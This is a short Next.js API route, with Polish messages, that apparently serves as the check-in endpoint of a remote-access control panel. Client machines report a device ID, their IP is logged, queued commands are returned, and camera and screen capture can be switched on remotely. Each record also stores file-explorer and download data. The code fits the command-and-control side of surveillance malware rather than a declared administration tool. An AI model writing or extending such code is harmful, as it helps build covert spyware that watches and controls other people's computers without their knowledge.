import { NextResponse } from 'next/server';
import { clients } from '@/lib/store';

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const id = body.id || body.deviceId || "Nieznana Maszyna";
    // Odczytywanie IP
    const ip = req.headers.get("x-forwarded-for") || "Nieznane IP";
    console.log(`[PING] Received from ID: ${id}, IP: ${ip}`);

    let client = clients.get(id);
    if (!client) {
      client = { 
        id, 
        ip, 
        lastSeen: Date.now(), 
        messages: [], 
        explorerData: null, 
        downloadData: null, 
        cameraData: null, 
        isCameraActive: false,
        screenData: null,
        isScreenActive: false
      };
      clients.set(id, client);
    }
    
    const messagesToSend = [...client.messages];
    client.lastSeen = Date.now();
    client.ip = ip;
    client.messages = [];
    
    return NextResponse.json({ 
      status: "ok", 
      receivedMessages: messagesToSend,
      isCameraActive: client.isCameraActive,
      isScreenActive: client.isScreenActive
    }, {
      headers: { 'Cache-Control': 'no-store, max-age=0' },
    });
  } catch (err) {
    return NextResponse.json({ error: "Błędne zapytanie" }, { status: 400 });
  }
}
